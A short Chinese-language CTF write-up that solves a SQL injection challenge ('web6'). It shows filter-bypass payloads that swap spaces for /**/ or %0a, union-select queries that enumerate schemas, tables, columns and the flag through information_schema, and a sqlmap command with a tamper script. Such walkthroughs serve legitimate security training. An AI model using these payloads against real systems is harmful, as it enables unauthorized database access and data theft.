# web6
尝试sql注入,
BP抓包,使用1′ or 1=1#发现sql回显错误,测试发现空格被过滤,可用/**/绕过,%0a也可
1'or%0a1=1#
测试闭合符1'or/**/1=1#,1"or/**/1=1#
闭合符为'时有回显

接下来测回显位'or/**/1=1/**/union/**/select/**/1,2,3#,回显位位2 
![](vx_images/222782844368261.png =401x)

'or/**/1=1/**/union/**/select/**/1,group_concat(schema_name),3/**/from(information_schema.schemata)#
()也是绕过的方法之一
![](vx_images/392304693954528.png =825x)

查web2库的表
'or/**/1=1/**/union/**/select/**/1,group_concat(table_name),3/**/from(information_schema.tables)where(table_schema='web2')#
![](vx_images/213846153605390.png =630x)

接下来查列
'or/**/1=1/**/union/**/select/**/1,group_concat(column_name),3/**/from(information_schema.columns)where(table_name='flag')#
![](vx_images/394305566789452.png =572x)
最后查字段
'or/**/1=1/**/union/**/select/**/1,group_concat(flag),3/**/from(flag)#
![](vx_images/196866195696099.png =884x)

最后尝试sqlmap跑将抓取的POST包丢给sqlmap
python sqlmap.py -r /..............(路径) --tamper=space2comment(使用脚本绕过)
更多脚本参考[54774043](https://blog.csdn.net/whatday/article/details/54774043)